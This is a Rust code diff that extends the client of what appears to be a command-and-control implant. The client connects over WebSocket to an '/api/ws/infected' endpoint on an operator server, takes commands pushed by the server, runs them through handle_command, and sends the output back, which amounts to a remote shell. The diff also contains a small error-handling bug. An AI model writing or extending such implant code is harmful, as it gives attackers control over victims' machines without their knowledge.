@@ -1,29 +1,30 @@
 mod payloads;
+mod handlers;
 
 use std::{
-    sync::{LazyLock, Mutex},
-    time::Duration,
+    sync::{LazyLock, Mutex}, time::Duration
 };
 
 use anyhow::Result;
 use payloads::general::StringPayload;
 
-use futures_util::{SinkExt, StreamExt};
-use tokio::time::{Interval, interval};
+use futures_util::{SinkExt, StreamExt, stream::SplitSink};
+use tokio::{net::TcpStream, time::interval};
 use tokio_tungstenite::{
-    WebSocketStream, connect_async,
-    tungstenite::{Message, handshake::client::generate_key, http::Request},
+    MaybeTlsStream, WebSocketStream, connect_async, tungstenite::{Message, handshake::client::generate_key, http::Request}
 };
 
 use crate::{
     constants::compiled::{self, WS_COMMANDER_RECONNECT, WS_URL},
     storage::STORAGE,
+    websockets::{handlers::{handle_command, handle_goodbye}, payloads::{Payload, SimccMessage}},
 };
+
+type WsSink = SplitSink<WebSocketStream<MaybeTlsStream<TcpStream>>, Message>;
 
 static RUNNING: LazyLock<Mutex<bool>> = LazyLock::new(|| Mutex::new(true));
 
 pub async fn start_ws_loop() -> Result<()> {
-
     // Construct a request with the `iid` set for authentication
     let req = Request::builder()
         .uri(WS_URL("/api/ws/infected"))
@@ -78,7 +79,12 @@ pub async fn start_ws_loop() -> Result<()> {
 
         while let Some(msg) = src.next().await {
             match msg {
-                Ok(Message::Text(text)) => println!("Got: {}", text),
+                Ok(Message::Text(text)) => {
+                    println!("{}", text);
+                    if let Err(e) = handle_generic_message(&text, &mut sink).await {
+                        eprintln!("Failed to handle message: {}", e);
+                    }
+                }
                 Ok(Message::Close(_)) => {
                     println!("Server closed connection");
                     break;
@@ -91,6 +97,57 @@ pub async fn start_ws_loop() -> Result<()> {
             }
         }
     }
+
+    Ok(())
+}
+
+async fn handle_generic_message(
+    text: &str,
+    sink: &mut WsSink,
+) -> Result<()> {
+    let req = serde_json::from_str::<SimccMessage>(text).unwrap();
+
+    // non-awaitable
+    match req.payload {
+        Payload::Err(err) => {
+            let msg = match err.msg {
+                Some(val) => val,
+                None => String::from("-")
+            };
+            println!("Got error from backend: type {}, {}", err.err_type, msg);
+        }
+        Payload::Goodbye(payload) => handle_goodbye(payload),
+
+        // send off for awaitables
+        awaitable => handle_awaited_messages(awaitable, sink).await ?,
+    }
+
+    Ok(())
+}
+
+async fn handle_awaited_messages(
+    payload: Payload,
+    sink: &mut WsSink,
+) -> Result<()> {
+
+    let reply = match payload {
+        Payload::Command(command) => Some(
+            Payload::CommandOutput(handle_command(command))
+        ),
+        _ => None
+    };
+
+    if reply.is_none() {
+        anyhow::anyhow!("Unknown payload recieved from server!");
+    }
+
+    sink.send(
+        payloads::SimccMessage::builder()
+            .payload(reply.unwrap())
+            .build()
+            .try_into()?,
+    )
+    .await?;
 
     Ok(())
 }
